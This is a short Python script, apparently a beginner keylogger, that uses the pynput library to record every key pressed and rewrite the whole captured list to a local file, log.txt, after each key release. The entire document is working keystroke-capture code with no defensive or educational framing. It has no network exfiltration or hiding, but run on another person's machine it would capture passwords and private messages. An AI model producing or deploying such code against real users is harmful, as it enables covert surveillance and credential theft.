
from pynput.keyboard import Key,Listener
#keys list is initialized as an empty list. 
keys=[]

def on_press(key):
    keys.append(key)
        


def on_release(key):
  with open('log.txt','w')as file:#log.txt is the file to save the keys 
       file.writelines(str(keys))

  
with Listener(on_press=on_press,on_release=on_release)as listener:
   listener.join()
   
   
  
 